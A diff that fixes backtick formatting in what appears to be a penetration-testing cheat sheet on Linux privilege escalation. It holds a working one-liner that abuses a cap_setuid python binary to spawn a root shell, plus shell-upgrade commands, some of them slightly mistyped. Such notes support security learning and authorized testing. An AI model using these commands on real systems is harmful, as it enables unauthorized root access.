@@ -101,7 +101,7 @@ like delete it, if there's no placeholder we can just switch to root user withou
 
 * searching for capabilities: `getcap -r / 2>/dev/null`
 * found (ex) : `/usr/bin/python2.6 = cap_setuid+ep`
-* execute: ` /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+* execute: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 
 ### Escalation path: scheduled tasks
 
@@ -142,7 +142,7 @@ like delete it, if there's no placeholder we can just switch to root user withou
 
 ### Upgrade your shell on target machine
 
-* `python 'import pty;pty.spawn("/bin/bash")'
+* `python 'import pty;pty.spawn("/bin/bash")'`
 * `export TERM=xterm
 * background your shell with **CTRL+Z**
 * `ptty raw -echo; fg`
